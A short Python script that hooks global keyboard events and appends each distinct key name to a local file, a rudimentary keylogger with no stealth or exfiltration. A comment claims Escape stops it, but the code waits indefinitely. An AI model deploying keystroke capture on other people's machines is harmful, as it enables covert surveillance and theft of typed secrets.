import keyboard

# Set to store pressed keys to avoid duplicates
pressed_keys = set()

def on_key_event(e):
    # Check if the event is a key down event
    if e.event_type == 'down':
        # Add the key name to the set if it's not already there
        if e.name not in pressed_keys:
            pressed_keys.add(e.name)
            # Write the key to the file
            with open('keys.txt', 'a') as file:
                file.write(e.name + '\n')
                print(f"Logged key: {e.name}")

# Hook to listen for key events
keyboard.hook(on_key_event)

# Wait for the escape key to stop the script
keyboard.wait()

# Optional: Print all logged keys
print(f"All logged keys: {pressed_keys}")
